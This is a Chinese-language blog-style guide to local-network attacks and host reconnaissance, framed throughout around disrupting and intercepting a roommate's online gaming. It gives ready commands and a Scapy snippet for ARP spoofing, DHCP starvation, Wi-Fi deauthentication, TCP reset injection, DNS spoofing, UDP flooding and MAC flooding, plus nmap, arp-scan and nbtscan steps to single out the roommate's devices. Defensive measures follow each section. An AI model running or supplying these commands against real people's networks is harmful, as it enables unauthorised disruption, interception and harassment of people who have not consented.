嗯...如标题所示，有点好奇局域网攻击都有哪几种，于是上网搜索一番后发现以下方法，**效果分级**（从骚扰到断网）：

# 局域网攻击方式
## 一、ARP 欺骗 / 中间人（最经典、最灵活）

### 攻击原理

攻击者持续向室友发送伪造的 ARP 应答，把「网关 IP → 攻击者 MAC」的映射写进室友的 ARP 缓存表。之后室友发出的所有数据包（包括游戏流量）都会先送到攻击者的机器上。

然后攻击者可以：

- **直接丢弃**：游戏包有去无回，表现为掉线
- **随机丢弃 30%**：游戏疯狂卡顿、跳 ping，比断网更折磨人
- **延迟转发**：把包扣留 500ms 后再转发，让室友的延迟稳定在 500ms+，MOBA/FPS 游戏基本没法玩

### 具体工具

Bash



# bettercap（最推荐）

sudo bettercap -eval "set arp.spoof.targets 室友IP; arp.spoof on"

# 或者经典套装

sudo arpspoof -i eth0 -t 室友IP 网关IP

sudo arpspoof -i eth0 -t 网关IP 室友IP

### 🛡 防御措施

1. **静态 ARP 绑定**（最彻底）
    - Windows：`arp -s 网关IP 网关正确MAC`
    - 做成开机启动脚本，防止被动态覆盖
2. **ARP 防火墙软件**：如 火绒/360 的 ARP 防火墙模块，检测到 ARP 缓存被篡改会报警并自动修复
3. **交换机层面启用 DAI（动态 ARP 检测）**：这是校园网管理员该做的事——交换机校验 ARP 报文和 DHCP Snooping 绑定表是否一致，不一致的直接丢弃
4. **开启 ARP 日志监控**：用 `arp -a` 或 Wireshark 定期观察，发现网关 MAC 频繁变化立刻警觉

## 二、DHCP 耗尽 + 恶意 DHCP（让室友拿不到 IP 或拿到假网关）

### 攻击原理

**第一步：DHCP 饥饿攻击（DHCP Starvation）**  
不断伪造不同 MAC 地址向 DHCP 服务器申请 IP，直到把地址池全部耗尽。室友开机后 `DHCP Discover` 发出去，服务器无地址可分配。

**第二步（可选）：伪造 DHCP 服务器**  
如果攻击者抢在合法 DHCP 服务器之前回复，就可以给室友分配一个假网关（指向攻击者自己），效果和 ARP 欺骗一样，但更底层。

### 具体工具

Bash

# DHCP 饥饿

yersinia dhcp -interface eth0 -attack 1

# 恶意 DHCP 服务器（配合 responder 或 dnsmasq 伪造）

sudo responder -I eth0

### 🛡 防御措施

1. **交换机端口安全（Port Security）**：限制单个端口最大 MAC 地址数量，超过即 shutdown 或 restrict，DHCP 饥饿攻击直接失效
2. **DHCP Snooping**：交换机区分信任口（接合法 DHCP 服务器）和非信任口（接用户），非信任口上的 DHCP Offer/ACK 直接丢弃
3. **客户端层面**：当网络异常时，先用 `ipconfig /release && ipconfig /renew`（Windows）或 `dhclient -r && dhclient`（Linux）手动续租，观察能否拿到正常 IP
4. **静态 IP**：如果校园网允许，直接手动设置 IP、掩码、网关、DNS，彻底绕过 DHCP

## 三、Wi-Fi 去认证攻击（仅当室友连的是 Wi-Fi）

### 攻击原理

802.11 协议中，**去认证帧（Deauthentication Frame）** 是明文且不需要加密的——攻击者伪造 AP 发送 Deauth 帧给室友，室友的网卡合法断开连接，重新关联……然后攻击者继续发，室友就会进入「连上 → 被踢 → 重连 → 又被踢」的死循环。游戏中直接掉线。

### 具体工具

Bash

# aircrack-ng 套件

sudo aireplay-ng -0 0 -a AP的BSSID -c 室友的MAC wlan0mon

# mdk4（更暴力）

sudo mdk4 wlan0mon d -B AP的BSSID -S 室友的MAC

### 🛡 防御措施

1. **802.11w（PMF，受保护的管理帧）**：这是 IEEE 标准，要求管理帧（包括 Deauth）也必须经过加密验证。需要 AP 和客户端都支持。WPA3 强制启用，WPA2 可选。路由器里找「Protected Management Frames」并设为 Required
2. **Wi-Fi 6/6E 的改进**：802.11ax 普遍对管理帧保护支持更好
3. **检测层面**：用 Wireshark 过滤 `wlan.fc.type_subtype == 0x0c`，如果短时间内大量 Deauth 帧且序列号不连续，基本可以断定受到攻击

## 四、TCP 重置攻击（精准打断游戏连接）

### 攻击原理

嗅探室友与游戏服务器之间的 TCP 连接，拿到源 IP/端口、目标 IP/端口、当前序列号（SEQ），然后伪造一个 `RST` 包发过去——TCP 连接立刻中断。精准、优雅、不产生大量流量，极难察觉。

工具：**ettercap 的 kill 插件**、**netwox 的 TCP RST 模块**、自定义 **Scapy** 脚本。

### 具体工具（Scapy 脚本示例）

Python

from scapy.all import *

# 嗅探室友→游戏服务器的包，拿到 SEQ 后

rst = IP(src=室友IP, dst=游戏服务器IP)/TCP(sport=室友端口, dport=游戏端口, flags="R", seq=当前SEQ)

send(rst)

### 🛡 防御措施

1. **TCP MD5 签名（RFC 2385）**：对 TCP 头部做 MD5 签名，攻击者不知道密码无法伪造 RST。主要用于 BGP，但游戏协议一般不采用
2. **TLS 1.3 / DTLS**：如果游戏使用加密传输，虽然 TCP RST 仍然可以插入（RST 在 TCP 层，不在 TLS 层），但至少连接中断后自动重连机制会重新建立加密会话，不会导致信息泄露
3. **防火墙出方向 SYN/RST 速率限制**：正常连接不会频繁收到 RST。如果游戏客户端每几秒就收到 RST，可以触发告警
4. **实际可行的个人防御**：换有线连接 + 交换机端口安全 + 静态 ARP，让攻击者先拿不到你的流量，TCP RST 也就无从伪造

## 五、DNS 劫投 / 投毒

### 攻击原理

校园网环境下，很多路由器把 DNS 请求广播到局域网。攻击者可以：

- **DNS 欺骗**：比合法 DNS 服务器更快回复，把「游戏登录服务器域名」解析到一个不可达 IP
- **配合 ARP 欺骗**：拦截室友的 DNS 请求，返回虚假结果

结果：室友能上网、能看视频，但游戏的登录服/对战服解析不了，或者解析到错误地址一直进不去。

### 具体工具

Bash

# bettercap 内置 DNS 欺骗模块

sudo bettercap -eval "set dns.spoof.domains game.example.com; dns.spoof on"

# Ettercap 的 dns_spoof 插件

sudo ettercap -T -q -P dns_spoof -M arp /室友IP/ /网关IP/

### 🛡 防御措施

1. **DoH（DNS over HTTPS）或 DoT（DNS over TLS）**：Windows 11 已原生支持 DoH；浏览器（Chrome/Firefox）可独立开启加密 DNS。DNS 请求被加密，攻击者无法劫持内容
2. **DNSSEC**：对 DNS 响应做数字签名，防篡改，但不防劫持（攻击者可以直接丢包）。现实是游戏厂商的域名基本都没配置 DNSSEC
3. **手动设置 DNS**：把 DNS 设为 `8.8.8.8` 或 `1.1.1.1`，然后结合 DoH/DoT 加密传输
4. **hosts 文件硬编码**：直接把游戏服务器的域名和 IP 写入 `C:\Windows\System32\drivers\etc\hosts`，绕过 DNS 查询

## 六、带宽占满攻击（最简单粗暴）

### 攻击原理

不是攻击协议，而是攻击**资源**。攻击者用自己或伪造源 IP 向室友的 IP 发送大量 UDP 垃圾流量，把寝室到接入交换机的带宽（通常是 100Mbps 或共享带宽）占满。正常的游戏报文（UDP 小包，对延迟极度敏感）在队列里排队，表现为跳 ping、卡顿、丢包。

### 具体工具

Bash

# hping3 UDP 洪水

sudo hping3 --udp --flood -p 随机端口 室友IP

# 或 iperf3 打满带宽（更"合法"）

iperf3 -c 室友IP -u -b 100M -t 99999

### 🛡 防御措施

1. **QoS（服务质量）**：在路由器上把小包（游戏流量通常 `< 150 字节`）标记为高优先级队列，即使带宽满了也优先转发
2. **交换机速率限制（Rate Limiting / Policing）**：校园网交换机可以对每个端口限制入向/出向速率，单个端口满载不影响其他端口
3. **基于流的限速**：如果 P2P/UDP 流量异常高，设备自动对该流做整形
4. **个人层面尴尬点**：如果是同一广播域内的二层洪泛（攻击者直接 MAC 打满），个人比较难防。最有效的方式是联系网管查交换机端口流量异常，找到攻击源直接 shutdown 端口

## 七、MAC 洪泛（让交换机变集线器）

### 攻击原理

交换机通过 CAM 表（MAC 地址表）来记住「哪个 MAC 在哪个端口」。CAM 表有容量上限（通常几千到几万条目）。攻击者持续伪造海量随机源 MAC 地址的帧发送出来，当 CAM 表被挤满后，大部分交换机会**回退到「泛洪」模式**——把每个帧复制到所有端口。

效果：攻击者的网卡现在能收到全网的流量（包括室友的游戏包），然后配合 TCP RST / ARP 欺骗，所有中间人攻击的门槛大大降低。

### 具体工具

Bash

# macof（dsniff 套件）

sudo macof -i eth0

# yersinia

sudo yersinia macof -interface eth0

### 🛡 防御措施

1. **端口安全（Port Security）**：限制单个端口最大 MAC 数量，超出后 shutdown 或 restrict —— MAC 洪泛直接失效
2. **MAC 地址漂移检测**：同一个 MAC 在不同端口之间跳变（MAC Flapping），交换机可以告警并自动阻断
3. **基于 802.1X 的准入控制**：不认证就不能上网，攻击者在认证之前连 MAC 洪泛的机会都没有

# 局域网发现主机

## 局域网主机发现：攻击者视角全方案

当攻击者把网线插到自己电脑上，第一步永远是**侦察**——搞清楚这个网络里有多少台设备、哪些是室友的、哪些是网关/DNS/打印机。以下是攻击者从零开始，由浅入深的主机发现手段。

---

## 前提：先确定自己是否已经拿到 IP

插入网线后，攻击者首先面临两种情况：

|情况|判断方式|含义|
|---|---|---|
|DHCP 自动分配了 IP|`ipconfig`（Win）/`ip addr`（Linux）看到正常 IP|网络有 DHCP 服务器，攻击者已经"合法"入网|
|拿到 169.254.x.x（APIPA）|Windows 自动配置地址|DHCP 失败，但攻击者仍可进行二层嗅探|
|没有任何动静|网线不通 / 端口没开 / 需要 802.1X 认证|先绕过认证，否则后面的无从谈起|

本章假设攻击者已经拿到了有效 IP。

---

## 一、ARP 扫描（局域网最快最准）

### 原理

ARP 是二层的地址解析协议，**不经过防火墙**，只要在同一广播域内，发送 ARP 请求必定有回应（除非对方做了 ARP 静默）。ARP 扫描就依次向网段内每个 IP 发送「Who has IP xxx?」，谁回了就说明谁在线。

这是局域网主机发现的**首选方案**，因为：

- 速度快（可以并发）
- 无法被主机防火墙阻止（ARP 不是 IP 层，Windows 防火墙拦不住）
- 100% 准确（不会有端口扫描的假阳性/假阴性）

### 工具

Bash

# nmap（最通用）

nmap -sn -PR 192.168.1.0/24

# arp-scan（Linux，超快，专门做 ARP 扫描）

sudo arp-scan --localnet

sudo arp-scan 192.168.1.0/24

# netdiscover（Linux，可被动也可主动）

sudo netdiscover -r 192.168.1.0/24

# Windows PowerShell 手动扫

1..254 | % { Test-Connection 192.168.1.$_ -Count 1 -Quiet }

### 从 ARP 结果中识别室友

|线索|说明|
|---|---|
|MAC 地址 OUI|前 3 字节查厂商：`AA:BB:CC` → 联想拯救者 → 游戏本 → 很可能是室友|
|主机名|有人把电脑名设成「寝室号-张三」|
|DHCP 主机名|nmap 用 `-A` 有时能抓到 Windows 的 NetBIOS 名|
|在线时间|室友打游戏时一定在线，配合时间推测|

Bash

# 查 MAC 厂商（在线工具或本地 OUI 数据库）

# Linux 自带 OUI 数据库

grep "AA:BB:CC" /usr/share/arp-scan/ieee-oui.txt

# nmap 带厂商识别

nmap -sn 192.168.1.0/24 --script mac-geolocation

---

## 🛡 防御 ARP 扫描

说实话，ARP 扫描**在主机层面几乎无法阻止**，因为 ARP 工作在二层，主机防火墙管不到。防御的办法在交换机上：

1. **端口隔离（Port Isolation / Private VLAN）**：同一交换机上不同端口间禁止二层互通，这是最有效的方案。ARP 请求发出去也不会到达室友的端口
2. **DAI（动态 ARP 检测）**：结合 DHCP Snooping，只允许合法的 ARP 报文通过，异常 ARP 请求直接丢弃（但这个主要防欺骗，不防扫描）
3. **802.1X 准入控制**：攻击者不认证根本拿不到 IP，连内网都进不来

## 二、被动监听（零流量，完全隐匿）

### 原理

攻击者把网卡设为混杂模式，不说话、不发包，只静静地听线路上所有帧。

正常情况下交换机会根据 MAC 表精确转发，攻击者本应只能收到发给自己和广播的帧。但以下场景会导致大量流量泄露：

- **ARP 广播**：每台设备定期发 ARP 请求找网关，全网都收得到
- **DHCP 广播**：开机时 `DHCP Discover` 全网广播
- **mDNS（5353）**：苹果设备、打印机天天发
- **LLMNR / NBNS（137）**：Windows 解析本地名称时用
- **SSDP（1900）**：UPnP 设备发现
- **WS-Discovery**：Windows 10/11 网络发现功能

攻击者挂着 Wireshark 或 tcpdump 听 5 分钟，就能拿到局域网内几乎所有在线设备的 IP、MAC、主机名、操作系统类型，**而且完全无法被检测到**。

### 工具

Bash

# 被动嗅探神器

sudo netdiscover -p           # 纯被动模式

sudo p0f -i eth0              # 被动操作系统指纹

sudo bettercap -eval "net.sniff on; net.show"

# tcpdump 过滤广播流量

sudo tcpdump -i eth0 -n 'broadcast or multicast' -v

# Wireshark 过滤表达式

arp or mdns or llmnr or nbns or ssdp or dhcp or igmp

### 从被动监听中获取的信息量

|协议|泄露的信息|
|---|---|
|DHCP Request|主机名、请求的 IP、请求的参数列表（可推断 OS）|
|mDNS|主机名.local、服务类型（_airplay._tcp 说明是苹果设备）|
|NBNS|NetBIOS 名 + 用户名（如 `DESKTOP-XXX<20>` 是文件共享服务）|
|SSDP|设备类型（路由器的 InternetGatewayDevice 标识）|
|IGMP|组播组成员，室友看 IPTV 或局域网直播时会触发|

---

## 🛡 防御被动监听

1. **交换机端口隔离**（再次出现）：端口间禁止单播通信，攻击者只能收到广播——但上面那些协议恰恰全是广播/组播
2. **禁用不必要的广播协议**：
    - mDNS：关掉 Bonjour 服务（苹果设备较难）
    - LLMNR：组策略禁用（Windows）→ `Set-NetConnectionProfile -NetworkCategory Public`
    - WS-Discovery：Windows 设置 → 网络 → 关闭网络发现
3. **在交换机上 IGMP Snooping**：组播只发给真正需要接收的端口，减少泄露面
4. **最根本的**：还是网络准入 + 端口隔离，攻击者不认证就连不进这个 VLAN

## 三、ICMP Ping Sweep（三层扫描，跨网段也可用）

### 原理

依次向每个 IP 发送 ICMP Echo Request，收到 Echo Reply 就确定在线。

**局限性**：Windows 防火墙**默认禁止入站 ICMP**，所以对 Windows 主机基本 ping 不通。但路由器、打印机、Linux 服务器通常都会回应。

### 工具

Bash

# nmap

nmap -sn -PE 192.168.1.0/24

# fping（比 nmap 快）

fping -a -g 192.168.1.0/24 2>/dev/null

# Windows PowerShell 快速扫

1..254 | % { Test-Connection 192.168.1.$_ -Count 1 -ErrorAction SilentlyContinue }

### 底层变种：ICMP 类型扫描

|ICMP 类型|说明|绕过某些防火墙|
|---|---|---|
|Echo Request (Type 8)|标准 ping|最容易被拦|
|Timestamp Request (Type 13)|时间戳请求|老系统会回，现代 OS 大多忽略|
|Address Mask Request (Type 17)|子网掩码请求|几乎绝迹|
|空 ICMP（无负载）|异常包|某些设备会以 ICMP 错误回复，间接暴露|

Bash

# nmap 用时间戳和掩码请求探测

nmap -sn -PP -PM 192.168.1.0/24

---

## 🛡 防御 ICMP 扫描

- Windows 防火墙**默认就挡**，这是好的
- 不需要完全禁用 ICMP（IPv6 依赖 ICMPv6 做邻居发现），只需在入站规则中限制来源

## 四、TCP/UDP 端口扫描（绕过 ICMP 封锁）

当 ICMP 被挡时，攻击者依然可以通过 TCP 和 UDP 来探测存活主机。

### TCP SYN 扫描（半开扫描）

发送 SYN，如果收到 SYN-ACK → 主机在线且端口开放；收到 RST → 主机在线但端口关闭；收不到任何回应 → 主机不在线或被防火墙静默丢弃。

Bash

# nmap SYN 扫描（默认，需要 root）

nmap -sn -PS22,80,443,3389,8080 192.168.1.0/24

# 对所有在线主机再扫常见端口

nmap -sS -p 22,80,135,139,443,445,3389,8080 192.168.1.0/24

### TCP ACK 扫描（穿透无状态防火墙）

发送 ACK 包（非预期），收到 RST → 主机在线；无回应 → 被过滤或不在线。

Bash

nmap -sn -PA22,80,443 192.168.1.0/24

### UDP 探测

向常见 UDP 端口发送空包，如果收到 ICMP Port Unreachable → 主机在线。

Bash

nmap -sn -PU53,123,161,137,500 192.168.1.0/24

---

## 🛡 防御端口扫描

- Windows 防火墙默认行为（无监听端口时静默丢弃）已经能防大部分探测
- 但如果室友开着 135/139/445（文件共享/远程桌面），攻击者一发 SYN 就能确认在线
- 建议室友检查：`netstat -an | find "LISTENING"`，关掉不必要的监听服务

## 五、NetBIOS / SMB 轰炸（Windows 专属大招）

### 原理

Windows 系统的 NetBIOS（端口 137-139）和 SMB（端口 445）是主机发现的富矿：

Bash

# nmap 的 NetBIOS 扫描脚本

nmap -sU -p 137 --script nbstat.nse 192.168.1.0/24

# 用 smbclient 列所有共享

smbclient -L //192.168.1.x -N

# nbtscan（Win/Linux）

nbtscan 192.168.1.0/24

nbtscan 能直接扫出：**NetBIOS 名、工作组、登录用户名、MAC 地址**。很多时候室友的电脑名直接就是 `DESKTOP-ZHANGSAN`。

---

## 🛡 防御 NetBIOS/SMB 侦查

- **关闭 NetBIOS over TCP/IP**：网络适配器属性 → IPv4 → 高级 → WINS → 禁用
- **关闭文件和打印机共享**：控制面板 → 网络 → 更改高级共享设置 → 关闭
- **Windows 防火墙**：阻止入站 137/UDP、138/UDP、139/TCP、445/TCP

---

## 六、mDNS / Zeroconf 扫描（macOS、Linux、IoT 设备）

### 原理

苹果设备、Linux 桌面、打印机、智能电视会持续通过 mDNS（组播 DNS，端口 5353）宣告自己的存在：

Bash

# avahi 扫描（Linux）

avahi-browse -a -r -t

# 手动构造 mDNS 查询

dig @224.0.0.251 -p 5353 _services._dns-sd._udp.local PTR

一台 MacBook 能泄露的信息：`local` 主机名、AirPlay 接收器、屏幕共享服务、iTunes 资料库，甚至用户的 Apple ID 名称。

---

## 🛡 防御 mDNS 侦查

- macOS：不太容易完全关闭，但可以把「共享」偏好设置里的所有服务关掉
- Linux：`sudo systemctl disable avahi-daemon`
- 交换机 IGMP Snooping（再次）

---

## 七、UPnP / SSDP 扫描

### 原理

路由器、NAS、智能电视、游戏主机会通过 SSDP（简单服务发现协议，端口 1900）宣告自己：

Bash

# 发送 SSDP M-SEARCH 查询

echo -e "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n" | nc -u 239.255.255.250 1900

响应里通常包含设备型号、固件版本，攻击者一看到 `PS5`、`Xbox`、`Nintendo Switch` 就能锁定室友的游戏设备。

---

## 🛡 防御 UPnP/SSDP

- 路由器管理界面关掉 UPnP
- 游戏主机设置中关闭「允许网络唤醒」等功能
- Windows 服务 `SSDP Discovery` 设为禁用（不影响正常上网）

---

## 八、IPv6 邻居发现（很多人忘了这茬）

### 原理

在启用了 IPv6 的现代网络中（Windows 10/11 默认开启），即使 IPv4 防得严严实实，IPv6 的邻居发现协议（NDP，相当于 IPv4 的 ARP）同样可以用来做主机发现：

Bash

# 向链路本地地址发 ICMPv6 Echo

ping6 -I eth0 ff02::1

# nmap IPv6 扫描

nmap -6 --script targets-ipv6-multicast-echo

# alive6（THC-IPv6 套件）

alive6 eth0

---

## 🛡 防御 IPv6 扫描

- 如果确实不用 IPv6，在网卡属性里取消勾选 IPv6 协议
- 交换机上配置 RA Guard（路由器通告防护）

---

## 九、被动 Wi-Fi 嗅探（攻击者甚至不需要插网线）

如果攻击者的无线网卡支持监听模式，他可以先扫 Wi-Fi 环境：

Bash

# airodump-ng 看所有 AP 和客户端

sudo airodump-ng wlan0mon

# Kismet（更全面的被动搜集）

sudo kismet

能看到的：SSID、BSSID、每个客户端 MAC、关联到哪个 AP、信号强度（推测距离）、探测请求中历史连接过的 SSID（暴露设备拥有者的身份）。

---

## 🛡 防御 Wi-Fi 被动嗅探

- 无法彻底防止，因为无线电波是公开的
- 减少探测请求泄露：关闭「自动连接」已保存但不在范围内的网络
- WPA3 + PMF 可以保护关联后的管理帧，但广播的 Beacon/Probe Request 仍然是明文

## 十、全自动化侦察工具链

真正的攻击者不会一个个手动扫，而是直接用自动化侦察框架：

### bettercap（一站全包）

Bash

sudo bettercap -eval "

  net.probe on;

  net.recon on;

  net.show;

  net.sniff on

"

net.probe 同时用 ARP、mDNS、NBNS、SSDP、UPnP、WSD 等协议发探测包，5 秒内扫出所有在线主机。

### netdiscover

Bash

sudo netdiscover -r 192.168.1.0/24 -P

主动 + 被动结合，速度快且信息全。

### nmap 综合脚本

Bash

# 完整侦察：存活扫描 + 端口 + 服务版本 + OS 指纹 + 脚本

sudo nmap -sn -PR 192.168.1.0/24 -oN hosts.txt

sudo nmap -sS -sU -A -O -iL hosts.txt --script discovery

然后攻击者拿到一张完整的表：

|IP|MAC|厂商|主机名|OS|开放端口|设备类型|
|---|---|---|---|---|---|---|
|192.168.1.5|联想OUI|Lenovo|DESKTOP-LISI|Win11|135,445|室友电脑|
|192.168.1.8|Nintendo|Switch|—|定制OS|无|室友游戏机|
|192.168.1.1|TP-Link|—|—|Linux|53,80,443|路由器|

## 🛡 综合防御策略总结

|防御层级|具体措施|防住什么|
|---|---|---|
|**最好（网络管理员做）**|802.1X + 端口隔离 + DAI + DHCP Snooping|攻击者第一步就进不来|
|**次好（网络管理员做）**|VLAN 划分，每个寝室一个隔离 VLAN|攻击者只能扫自己的寝室|
|**个人能做（室友）**|关 NetBIOS、关网络发现、关 mDNS、关 UPnP、关 IPv6|减少被动泄露的信息量|
|**个人能做（室友）**|Windows 防火墙默认 + 不用公共网络配置文件|阻止大部分主动探测|
|**个人能做（室友）**|使用 VPN（连回自己路由器或付费 VPN）|所有流量加密，攻击者无计可施|
|**检测入侵**|安装 ARP 防火墙（火绒等），监控 ARP 异常|攻击者动起来就能发现|
|**终极**|自己办一个 5G CPE / 手机热点，不连校园网|物理隔离，彻底安全|

---

最后一句话：攻击者在掌握上述侦察手段后，下一步就是**锁定室友的设备**（通过 MAC 厂商、主机名、开机时间、流量特征），然后精准实施上ARP 欺骗 / TCP RST / 去认证攻击。
